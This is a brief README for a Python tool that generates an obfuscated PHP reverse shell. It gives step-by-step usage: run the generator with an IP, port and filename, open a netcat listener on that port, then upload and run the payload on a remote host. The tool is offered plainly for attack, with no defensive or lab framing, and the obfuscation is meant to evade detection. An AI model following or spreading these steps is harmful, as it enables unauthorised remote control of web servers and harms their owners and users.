# PHP reverse shell generator
This is a small python script to generate an obfuscated php reverse shell.

## Usage
1. Generate the payload: ``` python php_reverseshell_gen.py <ip> <port> <filename>```
2. Listen for incoming TCP connections on the port you choosen: ```nc -lvvp <port>```
2. Upload and execute the payload on the remote host
